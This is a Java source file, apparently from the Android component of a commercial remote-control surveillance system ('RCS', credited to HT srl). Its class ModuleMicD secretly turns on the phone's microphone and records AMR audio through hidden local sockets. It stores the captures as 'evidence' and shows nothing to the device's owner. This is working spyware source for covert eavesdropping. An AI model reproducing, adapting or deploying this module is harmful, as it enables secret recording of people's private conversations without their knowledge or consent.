/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : MicAgent.java
 * Created      : Apr 18, 2011
 * Author		: zeno
 * *******************************************/

package com.android.dvci.module;

import android.media.MediaRecorder;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;

import com.android.dvci.auto.Cfg;
import com.android.dvci.util.Check;
import com.android.dvci.util.DateTime;
import com.android.dvci.util.Utils;

import java.io.IOException;
import java.io.InputStream;

/**
 * The Class MicAgent. 8000KHz, 16bit
 *
 * @author zeno
 * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
 */
public class ModuleMicD extends ModuleMic {

	private static final String TAG = "ModuleMicD"; //$NON-NLS-1$

	private LocalSocket receiver;
	private LocalServerSocket lss;
	private LocalSocket sender;
	private InputStream is;
	private String socketname;

	public ModuleMicD() {
		super();
	}


	@Override
	void specificStop() {
		saveRecorderEvidence();
		stopRecorder();
	}

	@Override
	void specificGo(int numFailures) {
		if (numFailures < 10) {
			try {
				saveRecorderEvidence();
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (actualGo) Error: " + ex);
				}
			}
		}
	}

	protected byte[] getAvailable() {
		byte[] ret = null;
		try {
			if (receiver.isBound() && receiver.isConnected()) {
				if (is == null) {
					is = receiver.getInputStream();
				}

				final int available = is.available();
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getAvailable): " + available);//$NON-NLS-1$
				}
				ret = new byte[available];
				is.read(ret);
			}
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAvailable) Error: " + e);//$NON-NLS-1$
			}
		}

		return ret;
	}

	/**
	 * Start recorder.
	 *
	 * @throws IllegalStateException the illegal state exception
	 * @throws IOException           Signals that an I/O exception has occurred.
	 */
	synchronized void specificStart() throws IllegalStateException, IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (specificStart)");//$NON-NLS-1$
		}
		numFailures = 0;
		unfinished = null;

		final DateTime dateTime = new DateTime();
		fId = dateTime.getFiledate();

		createSockets();
		try {
			recorder = new MediaRecorder();
			recorder.setOnErrorListener(this);
			recorder.setOnInfoListener(this);
			recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
			recorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);
			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
			// dalla versione API 10, supporta anche AMR_WB

		/*
		 * recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		 * recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
		 * recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
		 * recorder.setAudioEncodingBitRate(16);
		 * recorder.setAudioSamplingRate(44100);
		 */
			recorder.setOutputFile(sender.getFileDescriptor());
			recorder.prepare();
			recorder.start(); // Recording is now started
		}catch (Exception e){
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (specificStart) Exception Error: delete socket and release recorder calling stopRecorder()");//$NON-NLS-1$
				stopRecorder();
			}
		}
	}

	private void createSockets() {
		receiver = new LocalSocket();

		try {
			socketname = Long.toHexString(Utils.getRandom());
			lss = new LocalServerSocket(socketname);
			receiver.connect(new LocalSocketAddress(socketname));
			receiver.setReceiveBufferSize(500000);
			receiver.setSendBufferSize(500000);
			sender = lss.accept();
			sender.setReceiveBufferSize(500000);
			sender.setSendBufferSize(500000);
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (createSockets) Error: " + e);//$NON-NLS-1$
			}
		}
	}

	private void deleteSockets() {
		try {
			is.close();
			is = null;
			sender.close();
			receiver.close();
			lss.close();
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (deleteSockets) Error: " + e);//$NON-NLS-1$
			}
		}
	}

	// http://sipdroid.googlecode.com/svn/trunk/src/org/sipdroid/sipua/ui/VideoCamera.java

	/**
	 * Stop recorder.
	 */
	protected synchronized void stopRecorder() {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (stopRecorder)");//$NON-NLS-1$
		}

		if (recorder != null) {
			recorder.setOnErrorListener(null);
			recorder.setOnInfoListener(null);

			try {
				recorder.stop();
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(ex);
				}
			}
			recorder.reset(); // You can reuse the object by going back to
			// setAudioSource() step
			// recorder.release(); // Now the object cannot be reused
			getAvailable();
			deleteSockets();

			recorder.release();
			recorder = null;
		}

	}

	@Override
	void specificSuspend() {
		saveRecorderEvidence();
		stopRecorder();
	}

	@Override
	void specificResume() {

	}


	public void onInfo(MediaRecorder mr, int what, int extra) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onInfo): " + what);//$NON-NLS-1$
		}
	}

	public void onError(MediaRecorder mr, int what, int extra) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (onError) Error: " + what);//$NON-NLS-1$
		}
		base_suspend();
	}
	@Override
	public String getTag() {
		return TAG;
	}
}
